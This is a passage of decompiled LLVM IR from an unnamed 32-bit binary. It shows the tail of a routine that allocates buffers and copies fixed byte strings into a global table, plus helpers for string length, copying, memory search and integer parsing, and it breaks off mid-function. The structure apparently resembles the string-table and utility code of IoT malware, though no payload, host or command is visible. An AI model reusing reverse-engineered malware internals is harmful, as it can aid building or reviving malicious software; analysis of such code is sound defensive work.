  store i32 %v0_117a8, i32* @global_var_1a7e0.377, align 4
  %v1_117ac = trunc i32 %v0_11798 to i8
  store i8 %v1_117ac, i8* bitcast (i32* @global_var_1a7e4.378 to i8*), align 4
  %v0_117b0 = load i32, i32* %r6.global-to-local, align 4
  %v1_117b0 = trunc i32 %v0_117b0 to i8
  store i8 %v1_117b0, i8* bitcast (i32* @global_var_1a7e5.379 to i8*), align 4
  %v1_117b4 = call i32* @malloc(i32 23)
  %v2_117b4 = ptrtoint i32* %v1_117b4 to i32
  store i32 %v2_117b4, i32* %r5.global-to-local, align 4
  %v0_117c4 = load i32, i32* %r8.global-to-local, align 4
  %v1_117c4 = load i32, i32* %sl.global-to-local, align 4
  %v2_117c4 = add i32 %v1_117c4, %v0_117c4
  store i32 %v2_117c4, i32* %r8.global-to-local, align 4
  %v4_117c8 = call i32 @function_11a58(i32 %v2_117b4, i32 ptrtoint ([24 x i8]* @global_var_12418.381 to i32), i32 23)
  %v0_117cc = load i32, i32* %r7.global-to-local, align 4
  %v0_117d0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_117d0, i32* @global_var_1a7e8.382, align 4
  %v0_117d4 = load i32, i32* %r8.global-to-local, align 4
  %v1_117d4 = trunc i32 %v0_117d4 to i8
  store i8 %v1_117d4, i8* bitcast (i32* @global_var_1a7ec.383 to i8*), align 4
  %v0_117d8 = load i32, i32* %r6.global-to-local, align 4
  %v1_117d8 = trunc i32 %v0_117d8 to i8
  store i8 %v1_117d8, i8* bitcast (i32* @global_var_1a7ed.384 to i8*), align 4
  %v1_117dc = call i32* @malloc(i32 %v0_117cc)
  %v3_117dc = ptrtoint i32* %v1_117dc to i32
  %v0_117e4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v3_117dc, i32* %r5.global-to-local, align 4
  %v4_117ec = call i32 @function_11a58(i32 %v3_117dc, i32 ptrtoint ([9 x i8]* @global_var_12430.386 to i32), i32 %v0_117e4)
  %v0_117f4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_117f4, i32* @global_var_1a7f0.387, align 4
  %v1_117f8 = trunc i32 %v0_117e4 to i8
  store i8 %v1_117f8, i8* bitcast (i32* @global_var_1a7f4.388 to i8*), align 4
  %v0_117fc = load i32, i32* %r6.global-to-local, align 4
  %v1_117fc = trunc i32 %v0_117fc to i8
  store i8 %v1_117fc, i8* bitcast (i32* @global_var_1a7f5.389 to i8*), align 4
  %v1_11800 = call i32* @malloc(i32 21)
  %v3_11800 = ptrtoint i32* %v1_11800 to i32
  store i32 %v3_11800, i32* %r5.global-to-local, align 4
  %v3_11810 = call i32 @function_11a58(i32 %v3_11800, i32 ptrtoint (i32* @global_var_124d8.391 to i32), i32 21)
  store i8 21, i8* bitcast (i32* @global_var_1a7fc.392 to i8*), align 4
  %v0_11820 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11820, i32* @global_var_1a7f8.393, align 4
  %v0_11824 = load i32, i32* %r6.global-to-local, align 4
  %v1_11824 = trunc i32 %v0_11824 to i8
  store i8 %v1_11824, i8* bitcast (i32* @global_var_1a7fd.394 to i8*), align 4
  %v1_11828 = call i32* @malloc(i32 17)
  %v3_11828 = ptrtoint i32* %v1_11828 to i32
  store i32 %v3_11828, i32* %r5.global-to-local, align 4
  %v4_11838 = call i32 @function_11a58(i32 %v3_11828, i32 ptrtoint ([18 x i8]* @global_var_1243c.396 to i32), i32 17)
  store i8 17, i8* bitcast (i32* @global_var_1a804.397 to i8*), align 4
  %v0_11848 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11848, i32* @global_var_1a800.398, align 4
  %v0_1184c = load i32, i32* %r6.global-to-local, align 4
  %v1_1184c = trunc i32 %v0_1184c to i8
  store i8 %v1_1184c, i8* bitcast (i32* @global_var_1a805.399 to i8*), align 4
  %v1_11850 = call i32* @malloc(i32 12)
  %v3_11850 = ptrtoint i32* %v1_11850 to i32
  store i32 %v3_11850, i32* %r5.global-to-local, align 4
  %v4_11860 = call i32 @function_11a58(i32 %v3_11850, i32 ptrtoint ([13 x i8]* @global_var_12450.401 to i32), i32 12)
  %v0_11868 = load i32, i32* %sb.global-to-local, align 4
  store i8 12, i8* bitcast (i32* @global_var_1a80c.402 to i8*), align 4
  %v0_11870 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11870, i32* @global_var_1a808.403, align 4
  %v0_11874 = load i32, i32* %r6.global-to-local, align 4
  %v1_11874 = trunc i32 %v0_11874 to i8
  store i8 %v1_11874, i8* bitcast (i32* @global_var_1a80d.404 to i8*), align 4
  %v1_11878 = call i32* @malloc(i32 %v0_11868)
  %v3_11878 = ptrtoint i32* %v1_11878 to i32
  %v0_11880 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v3_11878, i32* %r5.global-to-local, align 4
  %v4_11888 = call i32 @function_11a58(i32 %v3_11878, i32 ptrtoint ([15 x i8]* @global_var_12460.406 to i32), i32 %v0_11880)
  %v0_11890 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11890, i32* @global_var_1a810.407, align 4
  %v1_11894 = trunc i32 %v0_11880 to i8
  store i8 %v1_11894, i8* bitcast (i32* @global_var_1a814.408 to i8*), align 4
  %v0_11898 = load i32, i32* %r6.global-to-local, align 4
  %v1_11898 = trunc i32 %v0_11898 to i8
  store i8 %v1_11898, i8* bitcast (i32* @global_var_1a815.409 to i8*), align 4
  %v1_1189c = call i32* @malloc(i32 19)
  %v3_1189c = ptrtoint i32* %v1_1189c to i32
  store i32 %v3_1189c, i32* %r5.global-to-local, align 4
  %v4_118ac = call i32 @function_11a58(i32 %v3_1189c, i32 ptrtoint ([20 x i8]* @global_var_12470.411 to i32), i32 19)
  %v0_118b4 = load i32, i32* %r7.global-to-local, align 4
  store i8 19, i8* bitcast (i32* @global_var_1a81c.412 to i8*), align 4
  %v0_118bc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_118bc, i32* @global_var_1a818.413, align 4
  %v0_118c0 = load i32, i32* %r6.global-to-local, align 4
  %v1_118c0 = trunc i32 %v0_118c0 to i8
  store i8 %v1_118c0, i8* bitcast (i32* @global_var_1a81d.414 to i8*), align 4
  %v1_118c4 = call i32* @malloc(i32 %v0_118b4)
  %v3_118c4 = ptrtoint i32* %v1_118c4 to i32
  %v0_118cc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v3_118c4, i32* %r5.global-to-local, align 4
  %v4_118d4 = call i32 @function_11a58(i32 %v3_118c4, i32 ptrtoint ([9 x i8]* @global_var_12484.416 to i32), i32 %v0_118cc)
  %v0_118dc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_118dc, i32* @global_var_1a820.417, align 4
  %v1_118e0 = trunc i32 %v0_118cc to i8
  store i8 %v1_118e0, i8* bitcast (i32* @global_var_1a824.418 to i8*), align 4
  %v0_118e4 = load i32, i32* %r6.global-to-local, align 4
  %v1_118e4 = trunc i32 %v0_118e4 to i8
  store i8 %v1_118e4, i8* bitcast (i32* @global_var_1a825.419 to i8*), align 4
  %v1_118e8 = call i32* @malloc(i32 5)
  %v3_118e8 = ptrtoint i32* %v1_118e8 to i32
  store i32 %v3_118e8, i32* %r5.global-to-local, align 4
  %v4_118f8 = call i32 @function_11a58(i32 %v3_118e8, i32 ptrtoint ([6 x i8]* @global_var_12490.421 to i32), i32 5)
  %v0_11900 = load i32, i32* %fp.global-to-local, align 4
  store i8 5, i8* bitcast (i32* @global_var_1a82c.422 to i8*), align 4
  %v0_11908 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11908, i32* @global_var_1a828.423, align 4
  %v0_1190c = load i32, i32* %r6.global-to-local, align 4
  %v1_1190c = trunc i32 %v0_1190c to i8
  store i8 %v1_1190c, i8* bitcast (i32* @global_var_1a82d.424 to i8*), align 4
  %v1_11910 = call i32* @malloc(i32 %v0_11900)
  %v3_11910 = ptrtoint i32* %v1_11910 to i32
  %v0_11918 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v3_11910, i32* %r5.global-to-local, align 4
  %v4_11920 = call i32 @function_11a58(i32 %v3_11910, i32 ptrtoint ([7 x i8]* @global_var_12498.426 to i32), i32 %v0_11918)
  %v0_11924 = load i32, i32* %r8.global-to-local, align 4
  %v0_11928 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11928, i32* @global_var_1a830.427, align 4
  %v1_1192c = trunc i32 %v0_11918 to i8
  store i8 %v1_1192c, i8* bitcast (i32* @global_var_1a834.428 to i8*), align 4
  %v0_11930 = load i32, i32* %r6.global-to-local, align 4
  %v1_11930 = trunc i32 %v0_11930 to i8
  store i8 %v1_11930, i8* bitcast (i32* @global_var_1a835.429 to i8*), align 4
  %v1_11934 = call i32* @malloc(i32 %v0_11924)
  %v3_11934 = ptrtoint i32* %v1_11934 to i32
  %v0_1193c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v3_11934, i32* %r5.global-to-local, align 4
  %v4_11944 = call i32 @function_11a58(i32 %v3_11934, i32 ptrtoint ([24 x i8]* @global_var_124a0.431 to i32), i32 %v0_1193c)
  %v0_11948 = load i32, i32* %r6.global-to-local, align 4
  %v1_11948 = trunc i32 %v0_11948 to i8
  store i8 %v1_11948, i8* bitcast (i32* @global_var_1a83d.432 to i8*), align 4
  %v0_1194c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1194c, i32* @global_var_1a838.433, align 4
  %v0_11950 = load i32, i32* %r8.global-to-local, align 4
  %v1_11950 = trunc i32 %v0_11950 to i8
  store i8 %v1_11950, i8* bitcast (i32* @global_var_1a83c.434 to i8*), align 4
  %v2_11954 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_11954, i32* @r4, align 4
  ret i32 %v4_11944

; uselistorder directives
  uselistorder i32 %v3_11934, { 1, 0 }
  uselistorder i32 %v3_11910, { 1, 0 }
  uselistorder i32 %v3_118c4, { 1, 0 }
  uselistorder i32 %v3_11878, { 1, 0 }
  uselistorder i32 %v3_117dc, { 1, 0 }
  uselistorder i32 %v3_11790, { 1, 0 }
  uselistorder i32 %v3_1176c, { 1, 0 }
  uselistorder i32 %v2_11744, { 1, 0 }
  uselistorder i32 %v3_116f8, { 1, 0 }
  uselistorder i32 %v3_11684, { 1, 0 }
  uselistorder i32 %v2_11634, { 1, 0 }
  uselistorder i32 %v3_11570, { 1, 0 }
  uselistorder i32 %v2_11548, { 1, 0 }
  uselistorder i32 %v2_11520, { 1, 0 }
  uselistorder i32 %v3_114d4, { 1, 0 }
  uselistorder i32 %v3_114b0, { 0, 2, 1 }
  uselistorder i32 %v3_11484, { 0, 2, 1 }
  uselistorder i32 %v2_11454, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 0, 1, 4, 5, 6 }
  uselistorder i32* %r6.global-to-local, { 26, 27, 28, 29, 30, 31, 32, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 33 }
  uselistorder i32* %r5.global-to-local, { 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %fp.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 12, { 9, 5, 32, 37, 29, 38, 22, 19, 20, 21, 24, 10, 23, 11, 25, 12, 26, 27, 28, 30, 33, 34, 31, 39, 40, 41, 4, 42, 43, 44, 35, 36, 46, 47, 18, 48, 13, 49, 14, 50, 15, 51, 3, 52, 45, 86, 53, 6, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 16, 65, 66, 67, 68, 69, 17, 70, 71, 72, 73, 74, 75, 7, 76, 77, 78, 79, 80, 81, 8, 82, 83, 84, 85, 87, 88, 89, 90, 0, 1, 2 }
  uselistorder i32 17, { 3, 0, 16, 4, 17, 5, 6, 7, 8, 9, 10, 18, 11, 19, 12, 20, 13, 21, 14, 15, 22, 23, 1, 24, 25, 26, 2, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 21, { 3, 2, 9, 10, 11, 8, 4, 5, 6, 7, 0, 1 }
  uselistorder i32 23, { 0, 1, 5, 6, 2, 3, 4 }
  uselistorder i32 14, { 0, 8, 1, 7, 4, 9, 5, 10, 11, 6, 12, 13, 14, 15, 2, 16, 17, 18, 19, 3, 20 }
  uselistorder i8 5, { 11, 12, 13, 0, 1, 10, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 22, { 1, 0, 7, 2, 3, 4, 5, 8, 6 }
  uselistorder i8 16, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 19, { 5, 1, 6, 2, 0, 10, 7, 8, 9, 11, 3, 12, 4, 13 }
  uselistorder i32 5, { 15, 4, 16, 5, 25, 2, 17, 24, 3, 0, 18, 19, 20, 21, 22, 23, 29, 30, 31, 32, 6, 33, 34, 35, 36, 7, 37, 38, 39, 40, 41, 42, 43, 44, 8, 45, 46, 47, 9, 48, 49, 50, 10, 51, 52, 53, 54, 11, 55, 56, 57, 58, 12, 59, 60, 61, 62, 63, 64, 65, 13, 66, 68, 69, 70, 71, 72, 73, 14, 74, 67, 26, 1, 27, 28 }
  uselistorder i32 7, { 1, 16, 19, 13, 20, 14, 21, 15, 22, 0, 17, 23, 18, 24, 25, 26, 2, 27, 28, 29, 30, 3, 31, 32, 33, 34, 4, 35, 5, 36, 6, 37, 38, 7, 39, 40, 8, 41, 42, 9, 43, 10, 44, 45, 46, 47, 11, 48, 50, 51, 52, 53, 12, 54, 49 }
  uselistorder i32 6, { 2, 29, 3, 15, 25, 16, 26, 17, 27, 14, 28, 0, 18, 30, 1, 4, 34, 35, 36, 5, 37, 38, 39, 40, 6, 41, 42, 43, 44, 7, 45, 8, 46, 47, 48, 19, 49, 9, 50, 51, 52, 20, 53, 10, 54, 55, 56, 21, 57, 58, 59, 22, 60, 11, 61, 62, 63, 64, 23, 65, 12, 66, 68, 69, 70, 71, 72, 24, 73, 13, 74, 67, 31, 32, 33 }
  uselistorder i32 29, { 1, 0, 3, 10, 2, 8, 9, 4, 11, 5, 12, 6, 13, 14, 7 }
  uselistorder i32 13, { 4, 10, 1, 7, 8, 9, 12, 11, 0, 13, 14, 15, 16, 17, 5, 18, 19, 20, 21, 22, 23, 24, 25, 6, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 2, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 3, 54, 55 }
  uselistorder i32 (i32, i32, i32)* @function_11a58, { 9, 8, 7, 6, 5, 4, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 12, 11, 10, 3, 2, 1, 0, 13 }
  uselistorder i32 ptrtoint (i32* @global_var_1a740.266 to i32), { 5, 0, 1, 2, 3, 4 }
  uselistorder i32* (i32)* @malloc, { 27, 32, 25, 17, 35, 12, 14, 26, 0, 1, 2, 4, 3, 6, 5, 29, 8, 23, 15, 28, 13, 11, 9, 7, 36, 24, 34, 21, 16, 37, 19, 18, 20, 31, 10, 22, 30, 33, 38 }
}

define i32 @function_119dc(i8* %arg1) local_unnamed_addr {
dec_label_pc_119dc:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_119e0 = load i8, i8* %arg1, align 1
  %v4_119e0 = zext i8 %v3_119e0 to i32
  %v2_119e4 = icmp eq i8 %v3_119e0, 0
  br i1 %v2_119e4, label %dec_label_pc_11a00, label %bb

dec_label_pc_11a00:                               ; preds = %dec_label_pc_119f0, %dec_label_pc_119dc
  %merge = phi i32 [ %v4_119e0, %dec_label_pc_119dc ], [ %v1_119f0, %dec_label_pc_119f0 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_119dc
  br label %dec_label_pc_119f0

dec_label_pc_119f0:                               ; preds = %dec_label_pc_119f0, %bb
  %v0_119f0 = phi i32 [ %v1_119f0, %dec_label_pc_119f0 ], [ 0, %bb ]
  %v1_119f0 = add i32 %v0_119f0, 1
  %v2_119f4 = add i32 %v1_119f0, %tmp
  %v3_119f4 = inttoptr i32 %v2_119f4 to i8*
  %v4_119f4 = load i8, i8* %v3_119f4, align 1
  %v2_119f8 = icmp eq i8 %v4_119f4, 0
  br i1 %v2_119f8, label %dec_label_pc_11a00, label %dec_label_pc_119f0

; uselistorder directives
  uselistorder i32 %v1_119f0, { 1, 0, 2 }
}

define i32 @function_11a04(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11a04:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_11a04 = load i8, i8* %arg1, align 1
  %v3_11a04 = zext i8 %v2_11a04 to i32
  %v2_11a08 = icmp eq i8 %v2_11a04, 0
  br i1 %v2_11a08, label %dec_label_pc_11a4c, label %dec_label_pc_11a10

dec_label_pc_11a10:                               ; preds = %dec_label_pc_11a04
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11a14

dec_label_pc_11a14:                               ; preds = %dec_label_pc_11a14, %dec_label_pc_11a10
  %v0_11a14 = phi i32 [ %v1_11a14, %dec_label_pc_11a14 ], [ 0, %dec_label_pc_11a10 ]
  %v1_11a14 = add i32 %v0_11a14, 1
  store i32 %v1_11a14, i32* %ip.global-to-local, align 4
  %v2_11a18 = add i32 %v1_11a14, %tmp
  %v3_11a18 = inttoptr i32 %v2_11a18 to i8*
  %v4_11a18 = load i8, i8* %v3_11a18, align 1
  %v2_11a1c = icmp eq i8 %v4_11a18, 0
  br i1 %v2_11a1c, label %dec_label_pc_11a24, label %dec_label_pc_11a14

dec_label_pc_11a24:                               ; preds = %dec_label_pc_11a14
  %v7_11a24 = icmp eq i32 %v0_11a14, -2
  br i1 %v7_11a24, label %dec_label_pc_11a44, label %dec_label_pc_11a30.preheader

dec_label_pc_11a30.preheader:                     ; preds = %dec_label_pc_11a24, %dec_label_pc_11a4c
  %storemerge = phi i32 [ %v3_11a04, %dec_label_pc_11a4c ], [ %v1_11a14, %dec_label_pc_11a24 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_11a3c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_11a30

dec_label_pc_11a30:                               ; preds = %dec_label_pc_11a30.dec_label_pc_11a30_crit_edge, %dec_label_pc_11a30.preheader
  %v2_11a3c = phi i32 [ %v5_11a3c, %dec_label_pc_11a30.dec_label_pc_11a30_crit_edge ], [ %v2_11a3c.pre, %dec_label_pc_11a30.preheader ]
  %v0_11a34 = phi i32 [ %v0_11a34.pre, %dec_label_pc_11a30.dec_label_pc_11a30_crit_edge ], [ %tmp, %dec_label_pc_11a30.preheader ]
  %v0_11a30 = phi i32 [ %v0_11a30.pre, %dec_label_pc_11a30.dec_label_pc_11a30_crit_edge ], [ %storemerge, %dec_label_pc_11a30.preheader ]
  %v1_11a30 = add i32 %v0_11a30, -1
  store i32 %v1_11a30, i32* %r2.global-to-local, align 4
  %v1_11a34 = inttoptr i32 %v0_11a34 to i8*
  %v2_11a34 = load i8, i8* %v1_11a34, align 1
  %v5_11a34 = add i32 %v0_11a34, 1
  store i32 %v5_11a34, i32* %r1.global-to-local, align 4
  %v3_11a38 = icmp eq i32 %v0_11a30, 0
  %v3_11a3c = inttoptr i32 %v2_11a3c to i8*
  store i8 %v2_11a34, i8* %v3_11a3c, align 1
  %v4_11a3c = load i32, i32* @r0, align 4
  %v5_11a3c = add i32 %v4_11a3c, 1
  store i32 %v5_11a3c, i32* @r0, align 4
  br i1 %v3_11a38, label %dec_label_pc_11a44.loopexit, label %dec_label_pc_11a30.dec_label_pc_11a30_crit_edge

dec_label_pc_11a30.dec_label_pc_11a30_crit_edge:  ; preds = %dec_label_pc_11a30
  %v0_11a30.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_11a34.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11a30

dec_label_pc_11a44.loopexit:                      ; preds = %dec_label_pc_11a30
  %v0_11a44.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11a44

dec_label_pc_11a44:                               ; preds = %dec_label_pc_11a44.loopexit, %dec_label_pc_11a24
  %v0_11a44 = phi i32 [ %v0_11a44.pre, %dec_label_pc_11a44.loopexit ], [ %v1_11a14, %dec_label_pc_11a24 ]
  ret i32 %v0_11a44

dec_label_pc_11a4c:                               ; preds = %dec_label_pc_11a04
  store i32 %v3_11a04, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11a30.preheader

; uselistorder directives
  uselistorder i32 %v5_11a3c, { 1, 0 }
  uselistorder i32 %v0_11a34, { 1, 0 }
  uselistorder i32 %v1_11a14, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v3_11a04, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11a30.preheader, { 1, 0 }
}

define i32 @function_11a58(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11a58:
  %ip.global-to-local = alloca i32, align 4
  %v2_11a58 = icmp eq i32 %arg3, 0
  br i1 %v2_11a58, label %.loopexit, label %bb

.loopexit:                                        ; preds = %dec_label_pc_11a64, %dec_label_pc_11a58
  ret i32 %arg1

bb:                                               ; preds = %dec_label_pc_11a58
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11a64

dec_label_pc_11a64:                               ; preds = %dec_label_pc_11a64, %bb
  %v0_11a64 = phi i32 [ %v1_11a6c, %dec_label_pc_11a64 ], [ 0, %bb ]
  %v2_11a64 = add i32 %v0_11a64, %arg2
  %v3_11a64 = inttoptr i32 %v2_11a64 to i8*
  %v4_11a64 = load i8, i8* %v3_11a64, align 1
  %v4_11a68 = add i32 %v0_11a64, %arg1
  %v5_11a68 = inttoptr i32 %v4_11a68 to i8*
  store i8 %v4_11a64, i8* %v5_11a68, align 1
  %v0_11a6c = load i32, i32* %ip.global-to-local, align 4
  %v1_11a6c = add i32 %v0_11a6c, 1
  store i32 %v1_11a6c, i32* %ip.global-to-local, align 4
  %v9_11a70 = icmp eq i32 %v1_11a6c, %arg3
  br i1 %v9_11a70, label %.loopexit, label %dec_label_pc_11a64

; uselistorder directives
  uselistorder i32 %v1_11a6c, { 1, 2, 0 }
}

define i32 @function_11a7c() local_unnamed_addr {
dec_label_pc_11a7c:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %v0_11a7c = load i32, i32* @r1, align 4
  %v2_11a7c = icmp eq i32 %v0_11a7c, 0
  br i1 %v2_11a7c, label %bb, label %bb3

bb:                                               ; preds = %dec_label_pc_11a7c
  %v2_11a80 = load i32, i32* @r0, align 4
  ret i32 %v2_11a80

bb3:                                              ; preds = %dec_label_pc_11a7c
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_11a8c4 = load i32, i32* @r0, align 4
  %v5_11a8c5 = inttoptr i32 %v3_11a8c4 to i8*
  store i8 0, i8* %v5_11a8c5, align 1
  %v0_11a906 = load i32, i32* %r3.global-to-local, align 4
  %v1_11a907 = add i32 %v0_11a906, 1
  store i32 %v1_11a907, i32* %r3.global-to-local, align 4
  %v1_11a948 = load i32, i32* @r1, align 4
  %v9_11a9410 = icmp eq i32 %v1_11a907, %v1_11a948
  br i1 %v9_11a9410, label %dec_label_pc_11a9c, label %dec_label_pc_11a8c.dec_label_pc_11a8c_crit_edge

dec_label_pc_11a8c.dec_label_pc_11a8c_crit_edge:  ; preds = %bb3, %dec_label_pc_11a8c.dec_label_pc_11a8c_crit_edge
  %v1_11a9011 = phi i32 [ %v1_11a90, %dec_label_pc_11a8c.dec_label_pc_11a8c_crit_edge ], [ %v1_11a907, %bb3 ]
  %v0_11a8c.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_11a8c.pre to i8
  %v3_11a8c = load i32, i32* @r0, align 4
  %v4_11a8c = add i32 %v3_11a8c, %v1_11a9011
  %v5_11a8c = inttoptr i32 %v4_11a8c to i8*
  store i8 %extract.t, i8* %v5_11a8c, align 1
  %v0_11a90 = load i32, i32* %r3.global-to-local, align 4
  %v1_11a90 = add i32 %v0_11a90, 1
  store i32 %v1_11a90, i32* %r3.global-to-local, align 4
  %v1_11a94 = load i32, i32* @r1, align 4
  %v9_11a94 = icmp eq i32 %v1_11a90, %v1_11a94
  br i1 %v9_11a94, label %dec_label_pc_11a9c, label %dec_label_pc_11a8c.dec_label_pc_11a8c_crit_edge

dec_label_pc_11a9c:                               ; preds = %dec_label_pc_11a8c.dec_label_pc_11a8c_crit_edge, %bb3
  %v1_11a9c = load i32, i32* @r0, align 4
  ret i32 %v1_11a9c

; uselistorder directives
  uselistorder i32 %v1_11a90, { 1, 2, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder label %dec_label_pc_11a8c.dec_label_pc_11a8c_crit_edge, { 1, 0 }
}

define i32 @function_11aa0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_11aa0:
  %v7_11ab4 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_11ab4, label %dec_label_pc_11ab8, label %dec_label_pc_11ac0

dec_label_pc_11ab8:                               ; preds = %dec_label_pc_11ad4, %dec_label_pc_11aa0, %dec_label_pc_11ac0
  ret i32 -1

dec_label_pc_11ac0:                               ; preds = %dec_label_pc_11aa0
  %tmp10 = icmp slt i32 %arg2, 1
  br i1 %tmp10, label %dec_label_pc_11ab8, label %dec_label_pc_11ac8

dec_label_pc_11ac8:                               ; preds = %dec_label_pc_11ac0
  br label %dec_label_pc_11ae0

dec_label_pc_11ad4:                               ; preds = %dec_label_pc_11af8, %dec_label_pc_11ae0
  %v1_11ad4 = add i32 %v0_11b00, 1
  %v9_11ad8 = icmp eq i32 %v1_11ad4, %arg2
  br i1 %v9_11ad8, label %dec_label_pc_11ab8, label %dec_label_pc_11ae0

dec_label_pc_11ae0:                               ; preds = %dec_label_pc_11ad4, %dec_label_pc_11ac8
  %v0_11b00 = phi i32 [ %v1_11ad4, %dec_label_pc_11ad4 ], [ 0, %dec_label_pc_11ac8 ]
  %v0_11aec = phi i32 [ %v1_11aec., %dec_label_pc_11ad4 ], [ 0, %dec_label_pc_11ac8 ]
  %v2_11ae0 = add i32 %v0_11aec, %arg3
  %v3_11ae0 = inttoptr i32 %v2_11ae0 to i8*
  %v4_11ae0 = load i8, i8* %v3_11ae0, align 1
  %v2_11ae4 = add i32 %v0_11b00, %arg1
  %v3_11ae4 = inttoptr i32 %v2_11ae4 to i8*
  %v4_11ae4 = load i8, i8* %v3_11ae4, align 1
  %v9_11ae8 = icmp eq i8 %v4_11ae4, %v4_11ae0
  %v1_11aec = add i32 %v0_11aec, 1
  %v1_11aec. = select i1 %v9_11ae8, i32 %v1_11aec, i32 0
  br i1 %v9_11ae8, label %dec_label_pc_11af8, label %dec_label_pc_11ad4

dec_label_pc_11af8:                               ; preds = %dec_label_pc_11ae0
  %v9_11af8 = icmp eq i32 %v1_11aec., %arg4
  br i1 %v9_11af8, label %dec_label_pc_11b00, label %dec_label_pc_11ad4

dec_label_pc_11b00:                               ; preds = %dec_label_pc_11af8
  %v1_11b00 = add i32 %v0_11b00, 1
  ret i32 %v1_11b00

; uselistorder directives
  uselistorder i1 %v9_11ae8, { 1, 0 }
  uselistorder i32 %v0_11aec, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11ab8, { 0, 2, 1 }
}

define i32 @function_11b08(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11b08:
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_11b14

dec_label_pc_11b14:                               ; preds = %.thread, %dec_label_pc_11b2c, %bb, %dec_label_pc_11b08
  %v0_11b14 = phi i32 [ %tmp, %dec_label_pc_11b08 ], [ %v5_11b14, %bb ], [ %v5_11b14, %dec_label_pc_11b2c ], [ %v5_11b14, %.thread ]
  %v1_11b14 = inttoptr i32 %v0_11b14 to i8*
  %v2_11b14 = load i8, i8* %v1_11b14, align 1
  %v5_11b14 = add i32 %v0_11b14, 1
  %v7_11b1c = icmp eq i8 %v2_11b14, 9
  br i1 %v7_11b1c, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_11b14
  br label %dec_label_pc_11b14

bb:                                               ; preds = %dec_label_pc_11b14
  %v8_11b20 = icmp eq i8 %v2_11b14, 32
  br i1 %v8_11b20, label %dec_label_pc_11b14, label %dec_label_pc_11b2c

dec_label_pc_11b2c:                               ; preds = %bb
  %v7_11b2c = icmp eq i8 %v2_11b14, 10
  br i1 %v7_11b2c, label %dec_label_pc_11b14, label %dec_label_pc_11b34

dec_label_pc_11b34:                               ; preds = %dec_label_pc_11b2c
  %v7_11b34 = icmp eq i8 %v2_11b14, 45
